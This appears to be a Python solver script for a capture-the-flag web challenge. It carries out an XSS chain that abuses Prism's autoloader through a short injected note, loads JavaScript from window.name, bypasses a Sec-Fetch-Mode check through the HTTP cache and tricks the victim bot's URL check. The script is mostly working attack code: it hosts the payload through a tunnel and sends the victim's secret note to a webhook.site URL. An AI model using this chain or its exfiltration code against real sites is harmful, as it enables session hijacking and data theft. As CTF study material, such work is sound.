"""
mouse-in-the-house remote solver.

Chain (single bot visit):
  1. Bot loads our /atk page (tunneled) with its bot session.
  2. /atk opens a seed popup  -> APP/notes/?search=  (navigate mode, bot cookie)
     -> 200 list page lands in the shared HTTP cache.
  3. /atk sets window.name = data:text/javascript,<FULLCODE> and navigates
     the tab to our payload note.
  4. Note page: Prism 2.0.0-alpha.1 autoloader imports
     "data:text/javascript,import(name)#<plugin>.js"  (fragment trick, 80 chars)
     -> module `import(name)` -> imports window.name data module -> FULLCODE runs
     with same-origin (sandbox allow-scripts+allow-same-origin).
  5. FULLCODE: fetch('/notes/?search=', {cache:'force-cache'}) -> cached 200 list
     (Sec-Fetch-Mode gate bypassed via the cache); scans note ids for
     h1 == "flag draft"; fetch('/notes/<id>') (no mode gate) -> flag.
  6. Exfil: history.replaceState(null,'','/') fools the bot's
     page.url().startsWith(APP_ORIGIN+'/notes/') abort check, then
     location.href = webhook URL with flag -> flag lands in webhook.site.

Usage:
  python solve_mouse_remote.py --app https://HOST.chal.ctf.ae --bot https://BOT  [--webhook UUID]
  (run `ngrok http 8000` / `ssh -R 80:localhost:8000 nokey@localhost.run` first;
   set TUNNEL_URL env to the public /atk base, e.g. https://xyz.localhost.run)
"""
import argparse
import json
import os
import re
import sys
import threading
import time
import urllib.parse
import urllib.request
import urllib3
import http.server
import socketserver

urllib3.disable_warnings()

PAYLOAD = "<a data-prism-plugins data-prism-plugin-path=data:text/javascript,import(name)#>"
assert len(PAYLOAD) <= 80, f"payload too long: {len(PAYLOAD)}"


def make_fullcode(exfil_url: str) -> str:
    return f"""
const o=location.origin;
const html=async u=>(await fetch(u,{{cache:'force-cache'}})).text();
(async()=>{{
 const ex=(f)=>{{try{{history.replaceState(null,'','/')}}catch(e){{}}
   location.href={json.dumps(exfil_url)}+encodeURIComponent(f)}};
 try{{
  let t='';
  for(let i=0;i<5;i++){{
   t=await html(o+'/notes/?search=');
   if(t.includes('</ul>')||!t.includes('No notes'))break;
   await new Promise(r=>setTimeout(r,700));
  }}
  const ids=[...t.matchAll(/href="\\/notes\\/([a-f0-9]{{8}})"/g)].map(m=>m[1]);
  for(const id of ids){{
   try{{
    const p=await html(o+'/notes/'+id);
    if(p.includes('flag draft')){{
     let flag=(p.match(/<main>([\\s\\S]*?)<\\/main>/)||[])[1]||'';
     flag=flag.replace(/<\\/?[^>]+>/g,'').trim();
     ex(flag);return;
    }}
   }}catch(e){{}}
  }}
  ex('NOTFOUND');
 }}catch(e){{ex('ERR:'+e.message)}}
}})();
""".strip()


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print("[SRV]", self.command, self.path)

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        if u.path == "/atk":
            nid = urllib.parse.parse_qs(u.query).get("n", [""])[0]
            fullcode = make_fullcode(EXFIL_URL)
            data = "data:text/javascript," + urllib.parse.quote(fullcode, safe="")
            html = f"""<!doctype html><html><body>
<script>
var w=window.open({json.dumps(APP + "/notes/?search=")});
window.name={json.dumps(data)};
setTimeout(function(){{location.href={json.dumps(APP + "/notes/")}+{json.dumps(nid)}}},1500);
</script></body></html>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(html.encode())
            return
        if u.path == "/c":
            flag = urllib.parse.unquote_plus(urllib.parse.parse_qs(u.query).get("f", [""])[0])
            print(f"\n[FLAG-ARRIVED] {flag}\n")
            with open(os.path.join(os.path.dirname(__file__), "flag_mouse.txt"), "a") as fh:
                fh.write(flag + "\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
            return
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")


class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True


def http_get(url, timeout=20):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.read().decode(errors="ignore")


def create_webhook():
    req = urllib.request.Request("https://webhook.site/token",
                                 data=b"", method="POST",
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read().decode())["uuid"]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--app", required=True, help="https://<instance>.chal.ctf.ae (no trailing slash)")
    ap.add_argument("--bot", required=True, help="bot base url, e.g. https://<bot>.chal.ctf.ae")
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--webhook", default=None, help="existing webhook.site uuid (else create one)")
    args = ap.parse_args()

    global APP, EXFIL_URL
    APP = args.app.rstrip("/")
    tunnel = os.environ.get("TUNNEL_URL", "").rstrip("/")
    wh_uuid = args.webhook or create_webhook()
    print(f"[*] webhook uuid: {wh_uuid}")
    EXFIL_URL = f"https://webhook.site/{wh_uuid}/?f="
    print(f"[*] exfil target: {EXFIL_URL}...")
    if tunnel:
        print(f"[*] tunnel base: {tunnel}")

    # 1. create the payload note via the app (Sec-Fetch-Mode: navigate)
    payload = urllib.parse.urlencode({"title": "hi", "body": PAYLOAD})
    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler)  # keep redirects
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    req = urllib.request.Request(APP + "/notes", data=payload.encode(),
                                 method="POST",
                                 headers={
                                     "Content-Type": "application/x-www-form-urlencoded",
                                     "Sec-Fetch-Mode": "navigate",
                                 })
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=20) as r:
            loc = r.headers.get("Location", "")
    except urllib.error.HTTPError as e:
        loc = e.headers.get("Location", "") if e.headers else ""
    m = re.search(r"/([a-f0-9]{8})$", loc)
    if not m:
        print(f"[-] note creation failed, location={loc!r}")
        sys.exit(1)
    note_id = m.group(1)
    print(f"[+] payload note: {APP}/notes/{note_id}")

    # 2. start local server
    srv = Server(("0.0.0.0", args.port), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[*] exploit server on :{args.port}")
    if not tunnel:
        print("[!] set TUNNEL_URL env to the public tunnel base for /atk (e.g. https://x.localhost.run)")
    atk_url = (tunnel + "/atk?n=" + note_id) if tunnel else f"http://127.0.0.1:{args.port}/atk?n={note_id}"
    print(f"[*] atk url: {atk_url}")

    # 3. submit to bot
    import ssl
    ctx = ssl._create_unverified_context()
    body = json.dumps({"url": atk_url}).encode()
    for attempt in range(5):
        req = urllib.request.Request(args.bot.rstrip("/") + "/visit", data=body, method="POST",
                                     headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=95, context=ctx) as r:
                print(f"[*] visit -> {r.status} {r.read().decode()[:80]!r}")
                break
        except urllib.error.HTTPError as e:
            print(f"[*] visit -> {e.code} {e.read().decode()[:80]!r}")
            if e.code == 429:
                time.sleep(20)
                continue
            break
        except Exception as e:
            print(f"[!] visit error: {e}")
            break

    # 4. poll webhook for the flag
    wh_api = f"https://webhook.site/token/{wh_uuid}/requests"
    deadline = time.time() + 75
    seen = set()
    while time.time() < deadline:
        try:
            st, txt = http_get(wh_api, 10)
            if st == 200:
                for item in json.loads(txt).get("data", []):
                    u = item.get("url", "")
                    if u in seen:
                        continue
                    seen.add(u)
                    print(f"[*] webhook hit: {u[:160]}")
                    fm = re.search(r"pwnsec\{[^}]+\}", u)
                    if fm:
                        print("\n" + "=" * 66)
                        print(f"[FLAG] {fm.group(0)}")
                        print("=" * 66 + "\n")
                        return
        except Exception as e:
            print(f"[!] poll: {e}")
        time.sleep(2)
    print("[-] no flag in window")


if __name__ == "__main__":
    main()